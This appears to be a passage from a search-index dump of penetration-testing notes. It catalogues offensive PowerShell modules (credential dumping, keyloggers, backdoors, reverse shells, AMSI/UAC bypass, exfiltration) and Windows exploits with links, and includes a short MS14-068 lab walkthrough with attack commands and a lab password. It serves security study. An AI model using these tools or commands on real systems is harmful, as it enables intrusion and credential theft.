ImperrsonateUser Invoke - CredentialInjection Create logons with clear-text credentials without triggering a suspicious Event ID 4648 (Explicit Credential Logon). Invoke - NinjaCopy Copies a file from an NTFS partitioned volume by reading the raw volume and parsing the NTFS structures. Copy from NTDS.dit, SYSTEM, SAM Hive Invoke - Mimikatz Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any functionality provided with Mimikatz. Invoke - Mimikatz - DumpCreds Invoke - Mimikatz - DumpCerts Get - Keystrokes Logs keys pressed, time and the active window. Get - GPPPassword Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences. KB2928120 Get - GPPAutologon Retrieves autologon username and password from registry.xml if pushed through Group Policy Preferences. Get - TimedScreenshot A function that takes screenshots at a regular interval and saves them to a folder. New - VolumeShadowCopy Creates a new volume shadow copy. Get - VolumeShadowCopy Lists the device paths of all local volume shadow copies. Mount - VolumeShadowCopy Mounts a volume shadow copy. Remove - VolumeShadowCopy Deletes a volume shadow copy. Get - VaultCredential Displays Windows vault credential objects including cleartext web credentials. Out - Minidump Generates a full-memory minidump of a process. Get - MicrophoneAudio Records audio from system microphone and saves to disk Mayhem Set - MasterBootRecord Proof of concept code that overwrites the master boot record with the message of your choice. Set - CriticalProcess Causes your machine to blue screen upon exiting PowerShell. Privesc PowerUp Clearing house of common privilege escalation checks, along with some weaponization vectors. Service Enumeration: Get - ServiceUnquoted - returns services with unquoted paths that also have a space in the name Get - ModifiableServiceFile - returns services where the current user can write to the service binary path or its config Get - ModifiableService - returns services the current user can modify Get - ServiceDetail - returns detailed information about a specified service Service Abuse: Invoke - ServiceAbuse - modifies a vulnerable service to create a local admin or execute a custom command Write - ServiceBinary - writes out a patched C# service binary that adds a local admin or executes a custom command Install - ServiceBinary - replaces a service binary with one that adds a local admin or executes a custom command Restore - ServiceBinary - restores a replaced service binary with the original executable DLL Hijacking: Find - ProcessDLLHijack - finds potential DLL hijacking opportunities for currently running processes Find - PathDLLHijack - finds service %PATH% DLL hijacking opportunities Write - HijackDll - writes out a hijackable DLL Registry Checks: Get - RegistryAlwaysInstallElevated - checks if the AlwaysInstallElevated registry key is set Get - RegistryAutoLogon - checks for Autologon credentials in the registry Get - ModifiableRegistryAutoRun - checks for any modifiable binaries/scripts (or their configs) in HKLM autoruns Miscellaneous Checks: Get - ModifiableScheduledTaskFile - find schtasks with modifiable target files Get - UnattendedInstallFile - finds remaining unattended installation files Get - Webconfig - checks for any encrypted web.config strings Get - ApplicationHost - checks for encrypted application pool and virtual directory passwords Get - SiteListPassword - retrieves the plaintext passwords for any found McAfee's SiteList.xml files Get - CachedGPPPassword - checks for passwords in cached Group Policy Preferences files Other Helpers/Meta-Functions: Get - ModifiablePath - tokenizes an input string and returns the files in it the current user can modify Get - CurrentUserTokenGroupSid - returns all SIDs that the current user is a part of, whether they are disabled or not Add - ServiceDacl - adds a Dacl field to a service object returned by Get-Service Set - ServiceBinPath - sets the binary path for a service to a specified value through Win32 API methods Test - ServiceDaclPermission - tests one or more passed services or service names against a given permission set Write - UserAddMSI - write out a MSI installer that prompts for a user to be added Invoke - AllChecks - runs all current escalation checks and returns a report Recon Invoke - Portscan Does a simple port scan using regular sockets, based (pretty) loosely on nmap. Get - HttpStatus Returns the HTTP Status Codes and full URL for specified paths when provided with a dictionary file. Invoke - ReverseDnsLookup Scans an IP address range for DNS PTR records. PowerView PowerView is series of functions that performs network and Windows domain enumeration and exploitation. Misc Export - PowerViewCSV - thread-safe CSV append Set - MacAttribute - Sets MAC attributes for a file based on another file or input (from Powersploit) Copy - ClonedFile - copies a local file to a remote location, matching MAC properties Get - IPAddress - resolves a hostname to an IP Test - Server - tests connectivity to a specified server Convert - NameToSid - converts a given user/group name to a security identifier (SID) Convert - SidToName - converts a security identifier (SID) to a group/user name Convert - NT4toCanonical - converts a user/group NT4 name (i.e. dev/john) to canonical format Get - Proxy - enumerates local proxy settings Get - PathAcl - get the ACLs for a local/remote file path with optional group recursion Get - UserProperty - returns all properties specified for users, or a set of user:prop names Get - ComputerProperty - returns all properties specified for computers, or a set of computer:prop names Find - InterestingFile - search a local or remote path for files with specific terms in the name Invoke - CheckLocalAdminAccess - check if the current user context has local administrator access to a specified host Get - DomainSearcher - builds a proper ADSI searcher object for a given domain Get - ObjectAcl - returns the ACLs associated with a specific active directory object Add - ObjectAcl - adds an ACL to a specified active directory object Get - LastLoggedOn - return the last logged on user for a target host Get - CachedRDPConnection - queries all saved RDP connection entries on a target host Invoke - ACLScanner - enumerate -1000+ modifable ACLs on a specified domain Get - GUIDMap - returns a hash table of current GUIDs - display names Get - DomainSID - return the SID for the specified domain Invoke - ThreadedFunction - helper that wraps threaded invocation for other net * Functions: Get - NetDomain - gets the name of the current user's domain Get - NetForest - gets the forest associated with the current user's domain Get - NetForestDomain - gets all domains for the current forest Get - NetDomainController - gets the domain controllers for the current computer's domain Get - NetUser - returns all user objects, or the user specified (wildcard specifiable) Add - NetUser - adds a local or domain user Get - NetComputer - gets a list of all current servers in the domain Get - NetPrinter - gets an array of all current computers objects in a domain Get - NetOU - gets data for domain organization units Get - NetSite - gets current sites in a domain Get - NetSubnet - gets registered subnets for a domain Get - NetGroup - gets a list of all current groups in a domain Get - NetGroupMember - gets a list of all current users in a specified domain group Get - NetLocalGroup - gets the members of a localgroup on a remote host or hosts Add - NetGroupUser - adds a local or domain user to a local or domain group Get - NetFileServer - get a list of file servers used by current domain users Get - DFSshare - gets a list of all distribute file system shares on a domain Get - NetShare - gets share information for a specified server Get - NetLoggedon - gets users actively logged onto a specified server Get - NetSession - gets active sessions on a specified server Get - NetRDPSession - gets active RDP sessions for a specified server (like qwinsta) Get - NetProcess - gets the remote processes and owners on a remote server Get - UserEvent - returns logon or TGT events from the event log for a specified host Get - ADObject - takes a domain SID and returns the user, group, or computer object associated with it Set - ADObject - takes a SID, name, or SamAccountName to query for a specified domain object, and then sets a specified 'PropertyName' to a specified 'PropertyValue' GPO functions: Get - GptTmpl - parses a GptTmpl.inf to a custom object Get - NetGPO - gets all current GPOs for a given domain Get - NetGPOGroup - gets all GPOs in a domain that set \"Restricted Groups\" on on target machines Find - GPOLocation - takes a user/group and makes machines they have effective rights over through GPO enumeration and correlation Find - GPOComputerAdmin - takes a computer and determines who has admin rights over it through GPO enumeration Get - DomainPolicy - returns the default domain or DC policy User-Hunting Functions: Invoke - UserHunter - finds machines on the local domain where specified users are logged into, and can optionally check if the current user has local admin access to found machines Invoke - StealthUserHunter - finds all file servers utilizes in user HomeDirectories, and checks the sessions one each file server, hunting for particular users Invoke - ProcessHunter - hunts for processes with a specific name or owned by a specific user on domain machines Invoke - UserEventHunter - hunts for user logon events in domain controller event logs Domain Trust Functions: Get - NetDomainTrust - gets all trusts for the current user's domain Get - NetForestTrust - gets all trusts for the forest associated with the current user's domain Find - ForeignUser - enumerates users who are in groups outside of their principal domain Find - ForeignGroup - enumerates all the members of a domain's groups and finds users that are outside of the queried domain Invoke - MapDomainTrust - try to build a relational mapping of all domain trusts MetaFunctions: Invoke - ShareFinder - finds (non-standard) shares on hosts in the local domain Invoke - FileFinder - finds potentially sensitive files on hosts in the local domain Find - LocalAdminAccess - finds machines on the domain that the current user has local admin access to Find - ManagedSecurityGroups - searches for active directory security groups which are managed and identify users who have write access to those groups (i.e. the ability to add or remove members) Find - UserField - searches a user field for a particular term Find - ComputerField - searches a computer field for a particular term Get - ExploitableSystem - finds systems likely vulnerable to common exploits Invoke - EnumerateLocalAdmin - enumerates members of the local Administrators groups across all machines in the domain Nishang https://github.com/samratashok/nishang - framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming ActiveDirectory Set-DCShadowPermissions Modify AD objects to provide minimal permissions required for DCShadow. Antak - the Webshell Antak Execute PowerShell scripts in memory, run commands, and download and upload files using this webshell. Backdoors HTTP-Backdoor A backdoor which can receive instructions from third party websites and execute PowerShell scripts in memory. DNS_TXT_Pwnage A backdoor which can receive commands and PowerShell scripts from DNS TXT queries, execute them on a target, and be remotely controlled using the queries. Execute-OnTime A backdoor which can execute PowerShell scripts at a given time on a target. Gupt-Backdoor A backdoor which can receive commands and scripts from a WLAN SSID without connecting to it. Add-ScrnSaveBackdoor A backdoor which can use Windows screen saver for remote command and script execution. Invoke-ADSBackdoor A backdoor which can use alternate data streams and Windows Registry to achieve persistence. Add-RegBackdoor A backdoor which uses well known Debugger trick to execute payload with Sticky keys and Utilman (Windows key + U). Set-RemoteWMI Modify permissions of DCOM and WMI namespaces to allow access to a non-admin user. Set-RemotePSRemoting Modify permissions of PowerShell remoting to allow access to a non-admin user. Bypass Invoke-AmsiBypass Implementation of publicly known methods to bypass/avoid AMSI. Client Out-CHM Create infected CHM files which can execute PowerShell commands and scripts. Out-Word Create Word files and infect existing ones to run PowerShell commands and scripts. Out-Excel Create Excel files and infect existing ones to run PowerShell commands and scripts. Out-HTA Create a HTA file which can be deployed on a web server and used in phishing campaigns. Out-Java Create signed JAR files which can be used with applets for script and command execution. Out-Shortcut Create shortcut files capable of executing PowerShell commands and scripts. Out-WebQuery Create IQY files for phishing credentials and SMB hashes. Out-JS Create JS files capable of executing PowerShell commands and scripts. Out-SCT Create SCT files capable of executing PowerShell commands and scripts. Out-SCF Create a SCF file which can be used for capturing NTLM hash challenges. Escalation Enable-DuplicateToken When SYSTEM privileges are required. Remove-Update Introduce vulnerabilities by removing patches. Invoke-PsUACme Bypass UAC. Execution Download-Execute-PS Download and execute a PowerShell script in memory. Download_Execute Download an executable in text format, convert it to an executable, and execute. Execute-Command-MSSQL Run PowerShell commands, native commands, or SQL commands on a MSSQL Server with sufficient privileges. Execute-DNSTXT-Code Execute shellcode in memory using DNS TXT queries. Out-RundllCommand Execute PowerShell commands and scripts or a reverse PowerShell session using rundll32.exe. Gather Check-VM Check for a virtual machine. Copy-VSS Copy the SAM file using Volume Shadow Copy Service. Invoke-CredentialsPhish Trick a user into giving credentials in plain text. FireBuster FireListener A pair of scripts for egress testing Get-Information Get juicy information from a target. Get-LSASecret Get LSA Secret from a target. Get-PassHashes Get password hashes from a target. Get-WLAN-Keys Get WLAN keys in plain text from a target. Keylogger Log keystrokes from a target. Invoke-MimikatzWdigestDowngrade Dump user passwords in plain on Windows 8.1 and Server 2012 Get-PassHints Get password hints of Windows users from a target. Show-TargetScreen Connect back and Stream target screen using MJPEG. Invoke-Mimikatz Load mimikatz in memory. Updated and with some customisation. Invoke-Mimikittenz Extract juicy information from target process (like browsers) memory using regex. Invoke-SSIDExfil Exfiltrate information like user credentials, using WLAN SSID. Invoke-SessionGopher Identify admin jump-boxes and/or computers used to access Unix machines. Extract information from Putty and RDP (ppk, rdp, stdid) Decrypt passwords for WinSCP from registry \"Admin\" required for remote operations \"-ExcludeDc\" to prevent detection MITM Invoke-Interceptor A local HTTPS proxy for MITM attacks. Pivot Create-MultipleSessions Check credentials on multiple computers and create PSSessions. Run-EXEonRemote Copy and execute an executable on multiple machines. Invoke-NetworkRelay Create network relays between computers. Prasadhak Prasadhak Check running hashes of running process against the VirusTotal database. Scan Brute-Force Brute force FTP, Active Directory, MSSQL, and Sharepoint. Port-Scan A handy port scanner. Powerpreter Powerpreter All the functionality of nishang in a single script module. Shells Invoke-PsGcat Send commands and scripts to specifed Gmail account to be executed by Invoke-PsGcatAgent Invoke-PsGcatAgent Execute commands and scripts sent by Invoke-PsGcat. Invoke-PowerShellTcp An interactive PowerShell reverse connect or bind shell Invoke-PowerShellTcpOneLine Stripped down version of Invoke-PowerShellTcp. Also contains, a skeleton version which could fit in two tweets. Invoke-PowerShellTcpOneLineBind Bind version of Invoke-PowerShellTcpOneLine. Invoke-PowerShellUdp An interactive PowerShell reverse connect or bind shell over UDP Invoke-PowerShellUdpOneLine Stripped down version of Invoke-PowerShellUdp. Invoke-PoshRatHttps Reverse interactive PowerShell over HTTPS. Invoke-PoshRatHttp Reverse interactive PowerShell over HTTP. Remove-PoshRat Clean the system after using Invoke-PoshRatHttps Invoke-PowerShellWmi Interactive PowerShell using WMI. Invoke-PowerShellIcmp An interactive PowerShell reverse shell over ICMP. Invoke-JSRatRundll An interactive PowerShell reverse shell over HTTP using rundll32.exe. Invoke-JSRatRegsvr An interactive PowerShell reverse shell over HTTP using regsvr32.exe. Utility Add-Exfiltration Add data exfiltration capability to Gmail, Pastebin, a web server, and DNS to any script. Add-Persistence Add reboot persistence capability to a script. Remove-Persistence Remote persistence added by the Add-Persistence script. Do-Exfiltration Pipe (|) this to any script to exfiltrate the output. Download Transfer a file to the target. Parse_Keys Parse keys logged by the keylogger. Invoke-Encode Encode and compress a script or string. Invoke-Decode Decode and decompress a script or string from Invoke-Encode. Start-CaptureServer Run a web server which logs Basic authentication and SMB hashes. ConvertTo-ROT13 Encode a string to ROT13 or decode a ROT13 string. Out-DnsTxt Generate DNS TXT records which could be used with other scripts. External Services Shodan: https://github.com/darkoperator/Posh-Shodan Scaning https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1 https://github.com/samratashok/nishang/blob/master/Scan/Invoke-PortScan.ps1 Parse Nmap Reports: https://github.com/SamuelArnold/StarKill3r/blob/master/Star%20Killer/Star%20Killer/bin/Debug/Scripts/SANS-SEC505-master/scripts/Day1-PowerShell/Parse-Nmap.ps1 Paser Nessus Reports: https://github.com/darkoperator/Posh-NVS Scandiff is a PowerShell script to automate host discovery and scanning with nmap: https://github.com/hardwaterhacker/scandiff Brute Forcing Active Directory brute forcing: https://github.com/samratashok/nishang/blob/master/Scan/Invoke-BruteForce.ps1 Get-WinRMPassword - https://poshsecurity.com/blog/2014/3/20/powershell-winrm-get-winrmpassword.html Get-WimPassword Database Attacks PowerUpSQL - Toolkit for Attacking SQL Server: https://github.com/NetSPI/PowerUpSQL Execute command over MSSQL: Nishang/Execute-Command-MSSQL.ps1 Capture NTLM https://github.com/Kevin-Robertson/Inveigh Obfuscation https://github.com/danielbohannon/Invoke-Obfuscation https://github.com/danielbohannon/Invoke-DOSfuscation Fileless Malware Invoke-NoShell outputs a Microsoft Office Word .doc file with an embedded macro: https://github.com/G4lB1t/Invoke-NoShell","title":"Modules"},{"location":"windows/powershell/#resources","text":"","title":"Resources"},{"location":"windows/powershell/#new-references","text":"PowerShell Basics for Security Professionals Part 1: https://www.youtube.com/watch?v=B0EsL1j_-qw Constrained Mode: https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/ https://github.com/subTee/CVE-2014-4113/blob/master/Invoke-SystemShell.ps1 http://www.labofapenetrationtester.com/2014/12/using-nishang-with-cobalt-strike.html http://blog.cobaltstrike.com/2014/09/23/cobalt-strike-2-1-i-have-the-powershell/","title":"New References"},{"location":"windows/powershell/#development-environment","text":"How To Make Visual Studio Code Look And Behave Like The PowerShell ISE: https://blog.techsnips.io/how-to-make-visual-studio-code-look-and-behave-like-the-powershell-ise/","title":"Development Environment"},{"location":"windows/windows-issues/","text":"Remote Exploits IIS MS16-143 / CVE-2017-7269 - Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2. Allows remote code execution. Via a long header beginning with \"If: http://\" in a PROPFIND request. Exploits: - https://www.exploit-db.com/exploits/41738 - https://github.com/gottburgm/Exploits/tree/master/CVE-2017-7269 - https://github.com/edwardz246003/IIS_exploit - exploit / windows / iis / iis_webdav_scstoragepathfromurl References: - 0patching the \"Immortal\" CVE-2017-7269 SMB MS17-010 - EternalBlue SMB Remote Windows Kernel Pool Corruption Vista SP2, 2008 SP2, 7 SP1, 2008 R2, 8.1, 2012, 2012 R2, RT 8.1, 10, 2016 CVE-2017-0143 to CVE-2017-0148 Exploit: - https://github.com/worawit/MS17-010 - https://github.com/nixawk/labs/blob/master/MS17_010/smb_exploit.py - https://github.com/qazbnm456/awesome-cve-poc/blob/master/MS17-010.md - exploit / windows / smb / ms17_010_eternalblue References: - https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/ - https://github.com/qazbnm456/awesome-cve-poc/blob/master/MS17-010.md - https://blog.rapid7.com/2017/05/19/metasploit-the-power-of-the-community-and-eternalblue/ Active Directory / Kerberos MS14-068 (PyKEK) KDC did not validate PAC checksum correctly Can rewrite ticket to be domain admin Internals - Request TGT with no PAC - Create a forged PAC signed with user's password hash - TGT is sent with forged PAC as the authenticator - KDS does validation - Request is for a Service Tickect with no PAC - Sees that TGT is with no PAC - Takes the forged PAC in the authenticator - Include that in a new TGT and use it for issueing Service Ticket - Request a deligation ticket to get it woking across DCs Detect by: - AS-REQ and TGS-REQ both containing \"Include PAC:false\" Fix: - Apply KB3011780 before DCPromo RPC MS03-026 - DCOM RPC Overflow Discovered by LSD Over Port - 135 Exploit: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS03-026 References: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS03-026 - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/10-years-on-a-look-back-at-ms08-067/ MS05-017 Exploit: - https://raw.githubusercontent.com/offensive-security/exploitdb/master/exploits/windows/remote/1075.c MS07-029 - Microsoft DNS RPC Service extractQuotedChar() Overflow (TCP) MS07-065 Other (Local) MS17-013 - Microsoft Graphics Componen Vista SP2, 2008 SP2, 7 SP1, 2008 R2, RT 8.1, 10, 2016, Exploit: - https://www.exploit-db.com/exploits/41656 References: MS10-061 - Windows Printer Spooler (Stuxnet) XP SP2/SP3, 2003 SP2, Vista SP1/SP2, 2008, 7, 2008 R2 Execute code with SYSTEM privilege if a printer is shared on the network (patched September 2010) Making DCE RPC request to the StartDocPrinter procedure (notifies the spooler that a new job arrived) Impersonate the Printer Spooler service (spoolsv.exe) to create a file (from working dir: %SystemRoot%\\system32 ) Sending WritePrinter requests, an attacker can fully control the content of the created file Gain code execution by writing to a directory used by WMI to deploy applications Wbem \\ Mof is periodically scanned and any new .mof files References: - http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html - os/windows/wmi.md Privilege Escalation Exploits MS16-032 - Secondary Logon to Address Elevation of Privilege Win7-Win10 2008-2012 - 32/64 bit Machine must have 2+ CPU cores Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032 - http://willgenovese.com/ms16-032-one-liners/ - ms16_032_secondary_logon_handle_privesc References: - https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html MS11-080 - Ancillary Function Driver (AfdJoinLeaf) XP, 2003 - 32/64 bit Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-080 - https://www.exploit-db.com/exploits/18176 - https://hackingandsecurity.blogspot.com/2016/05/ms11-080-privilege-escalation-windows.html python py installer module python pyinsaller . py --onefile example.py MS12-042 - Windows Kernel - SYSRET XP SP3, 2003, 7, 2008 R2 Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS12-042 - https://www.exploit-db.com/exploits/20861 MS15-051 - Windows Kernel-Mode Drivers (client_copy_image) 2003 SP2, Vista SP2, 2008 SP2, 7 SP1, 2008 R2 SP1, 8, 8.1, 2012, 2012 R2, RT, RT 8.1 - 32/64 bit Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051 - https://www.exploit-db.com/exploits/37049 - https://github.com/hfiref0x/CVE-2015-1701 - exploit / windows / local / ms15_051_client_copy_image References: - https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html MS10-092 - Task Scheduler Vista SP1/SP2, 2008, 7 2008 R2 - 32/64bit Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-092 - exploit / windows / local / ms10_092_schelevator References: - https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-092 - http://daveschull.com/wp-content/uploads/2015/05/Stuxnet_Under_the_Microscope.pdf MS14-058 - TrackPopupMenu Win32k NULL Pointer Dereference 2003, Vista, 2008, 2008 R2, 8, 8.1, 2012, 2012 R2, RT, RT 8.1, Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-058 - exploit / windows / local / ms14_058_track_popup_menu References: - https://www.crowdstrike.com/blog/crowdstrike-discovers-use-64-bit-zero-day-privilege-escalation-exploit-cve-2014-4113-hurricane-panda/ - https://www.freebuf.com/articles/system/50110.html MS14-070 - tcpip!SetAddrOptions NULL Pointer Dereference 2003 SP2 Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-070 - exploit / windows / local / ms14_070_tcpip_ioctl References: - https://blog.korelogic.com/blog/2015/01/28/2k3_tcpip_setaddroptions_exploit_dev - https://korelogic.com/Resources/Advisories/KL-001-2015-001.txt bypassuac_eventvwr MS10-015 - Kitrap0d MS14-068 - Kerberos Domain Privilege Escalation Exploits: - Python Kerberos Exploitation Kit - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek - The Mystery of Duqu 2.0: a sophisticated cyberespionage actor returns apt - get install krb5 - user cifs - utils rdate # Add proper nameservers in / etc / hosts / etc / krb5 . conf [ libdefaults ] default_realm = HTB . LOCAL # The following krb5 . conf variables are only for MIT Kerberos . kdc_timesync = 1 ccache_type = 4 forwardable = true proxiable = true # Edit the realms entry as follows : [ realms ] LAB . LOCAL = { kdc = mantis . htb . local : 88 admin_server = mantis . htb . local default_domain = HTB . LOCAL } # Also edit the final section : [ domain_realm ] . domain . internal = HTB . LOCAL domain . internal = HTB . LOCAL net time - S 10 . 10 . 10 . 52 - U # Set local time accordingly # OR USE rdate - n 10 . 10 . 10 . 52 python ms14 - 068. py - u james @htb . local - d mantis . htb . local - p J @m3s_P@ssW0rd ! - s S - 1 - 5 - 21 - 4220043660 - 4019079961 - 2895681657 Rename the generated ticket to \u200b / tmp / krb5cc_0 \u200b mv TGT_James @HTB . local . ccache / tmp / krb5cc_0 With Impacket (Golden PAC module): - kinit james (options ?) - klist (options ?) - python goldenPac . py htb . local / james @mantis . htb . local \u200b - Entering the password for the \u200b james \u200b user Manually: smbclient - W HTB . LOCAL // MANTIS / c $ - k References: - Additional information about CVE-2014-6324 - Attack Methods for Gaining Domain Admin Rights in Active Directory - HTB - Mantis CVE-2017-0213 - COM Aggregate Marshaler/IRemUnknown2 Type Confusion Privilege Escalation 10, 7, 8.1, 2008, 2008 R2, 2012, 2012 R2, 2016 When accessing an OOP COM object using IRemUnknown2 the local unmarshaled proxy can be for a different interface to that requested by QueryInterface resulting in a type confusion which can result in EoP. Exploit: - https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213 References: - https://bugs.chromium.org/p/project-zero/issues/detail?id=1107 - https://www.exploit-db.com/exploits/42020 MS11-013 Juicy Potato Need SeImpersonate or SeAssignPrimaryToken ( whoami / priv ) https://github.com/ohpe/juicy-potato https://github.com/TsukiCTF/Lovely-Potato http://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter/ Internals: Rotten Potato \u2013 Privilege Escalation from Service Accounts to SYSTEM: https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/","title":"Windows issues"},{"location":"windows/windows-issues/#remote-exploits","text":"","title":"Remote Exploits"},{"location":"windows/windows-issues/#iis","text":"","title":"IIS"},{"location":"windows/windows-issues/#ms16-143-cve-2017-7269-","text":"Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2. Allows remote code execution. Via a long header beginning with \"If: http://\" in a PROPFIND request. Exploits: - https://www.exploit-db.com/exploits/41738 - https://github.com/gottburgm/Exploits/tree/master/CVE-2017-7269 - https://github.com/edwardz246003/IIS_exploit - exploit / windows / iis / iis_webdav_scstoragepathfromurl References: - 0patching the \"Immortal\" CVE-2017-7269","title":"MS16-143 / CVE-2017-7269 -"},{"location":"windows/windows-issues/#smb","text":"","title":"SMB"},{"location":"windows/windows-issues/#ms17-010-eternalblue-smb-remote-windows-kernel-pool-corruption","text":"Vista SP2, 2008 SP2, 7 SP1, 2008 R2, 8.1, 2012, 2012 R2, RT 8.1, 10, 2016 CVE-2017-0143 to CVE-2017-0148 Exploit: - https://github.com/worawit/MS17-010 - https://github.com/nixawk/labs/blob/master/MS17_010/smb_exploit.py - https://github.com/qazbnm456/awesome-cve-poc/blob/master/MS17-010.md - exploit / windows / smb / ms17_010_eternalblue References: - https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/ - https://github.com/qazbnm456/awesome-cve-poc/blob/master/MS17-010.md - https://blog.rapid7.com/2017/05/19/metasploit-the-power-of-the-community-and-eternalblue/","title":"MS17-010 - EternalBlue SMB Remote Windows Kernel Pool Corruption"},{"location":"windows/windows-issues/#active-directory-kerberos","text":"","title":"Active Directory / Kerberos"},{"location":"windows/windows-issues/#ms14-068-pykek","text":"KDC did not validate PAC checksum correctly Can rewrite ticket to be domain admin Internals - Request TGT with no PAC - Create a forged PAC signed with user's password hash - TGT is sent with forged PAC as the authenticator - KDS does validation - Request is for a Service Tickect with no PAC - Sees that TGT is with no PAC - Takes the forged PAC in the authenticator - Include that in a new TGT and use it for issueing Service Ticket - Request a deligation ticket to get it woking across DCs Detect by: - AS-REQ and TGS-REQ both containing \"Include PAC:false\" Fix: - Apply KB3011780 before DCPromo","title":"MS14-068 (PyKEK)"},{"location":"windows/windows-issues/#rpc","text":"","title":"RPC"},{"location":"windows/windows-issues/#ms03-026-dcom-rpc-overflow-discovered-by-lsd","text":"Over Port - 135 Exploit: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS03-026 References: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS03-026 - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/10-years-on-a-look-back-at-ms08-067/","title":"MS03-026 - DCOM RPC Overflow Discovered by LSD"},{"location":"windows/windows-issues/#ms05-017","text":"Exploit: - https://raw.githubusercontent.com/offensive-security/exploitdb/master/exploits/windows/remote/1075.c","title":"MS05-017"},{"location":"windows/windows-issues/#ms07-029-microsoft-dns-rpc-service-extractquotedchar-overflow-tcp","text":"","title":"MS07-029 - Microsoft DNS RPC Service extractQuotedChar() Overflow (TCP)"},{"location":"windows/windows-issues/#ms07-065","text":"","title":"MS07-065"},{"location":"windows/windows-issues/#other-local","text":"","title":"Other (Local)"},{"location":"windows/windows-issues/#ms17-013-microsoft-graphics-componen","text":"Vista SP2, 2008 SP2, 7 SP1, 2008 R2, RT 8.1, 10, 2016, Exploit: - https://www.exploit-db.com/exploits/41656 References:","title":"MS17-013 - Microsoft Graphics Componen"},{"location":"windows/windows-issues/#ms10-061-windows-printer-spooler-stuxnet","text":"XP SP2/SP3, 2003 SP2, Vista SP1/SP2, 2008, 7, 2008 R2 Execute code with SYSTEM privilege if a printer is shared on the network (patched September 2010) Making DCE RPC request to the StartDocPrinter procedure (notifies the spooler that a new job arrived) Impersonate the Printer Spooler service (spoolsv.exe) to create a file (from working dir: %SystemRoot%\\system32 ) Sending WritePrinter requests, an attacker can fully control the content of the created file Gain code execution by writing to a directory used by WMI to deploy applications Wbem \\ Mof is periodically scanned and any new .mof files References: - http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html - os/windows/wmi.md","title":"MS10-061 - Windows Printer Spooler (Stuxnet)"},{"location":"windows/windows-issues/#privilege-escalation-exploits","text":"","title":"Privilege Escalation Exploits"},{"location":"windows/windows-issues/#ms16-032-secondary-logon-to-address-elevation-of-privilege","text":"Win7-Win10 2008-2012 - 32/64 bit Machine must have 2+ CPU cores Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032 - http://willgenovese.com/ms16-032-one-liners/ - ms16_032_secondary_logon_handle_privesc References: - https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html","title":"MS16-032 - Secondary Logon to Address Elevation of Privilege"},{"location":"windows/windows-issues/#ms11-080-ancillary-function-driver-afdjoinleaf","text":"XP, 2003 - 32/64 bit Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-080 - https://www.exploit-db.com/exploits/18176 - https://hackingandsecurity.blogspot.com/2016/05/ms11-080-privilege-escalation-windows.html python py installer module python pyinsaller . py --onefile example.py","title":"MS11-080 -  Ancillary Function Driver (AfdJoinLeaf)"},{"location":"windows/windows-issues/#ms12-042-windows-kernel-sysret","text":"XP SP3, 2003, 7, 2008 R2 Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS12-042 - https://www.exploit-db.com/exploits/20861","title":"MS12-042 - Windows Kernel - SYSRET"},{"location":"windows/windows-issues/#ms15-051-windows-kernel-mode-drivers-client_copy_image","text":"2003 SP2, Vista SP2, 2008 SP2, 7 SP1, 2008 R2 SP1, 8, 8.1, 2012, 2012 R2, RT, RT 8.1 - 32/64 bit Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051 - https://www.exploit-db.com/exploits/37049 - https://github.com/hfiref0x/CVE-2015-1701 - exploit / windows / local / ms15_051_client_copy_image References: - https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html","title":"MS15-051 - Windows Kernel-Mode Drivers (client_copy_image)"},{"location":"windows/windows-issues/#ms10-092-task-scheduler","text":"Vista SP1/SP2, 2008, 7 2008 R2 - 32/64bit Exploits: - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-092 - exploit / windows / local / ms10_092_schelevator References: - https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-092 - http://daveschull.com/wp-content/uploads/2015/05/Stuxnet_Under_the_Microscope.pdf","title":"MS10-092 - Task Scheduler"},{"location":"windows/windows-issues/#ms14-058-trackpopupmenu-win32k-null-pointer-dereference","text":"2003, Vista, 2008, 2008 R2, 8, 8.1, 2012, 2012 R2, RT, RT 8.1, Exploits: - 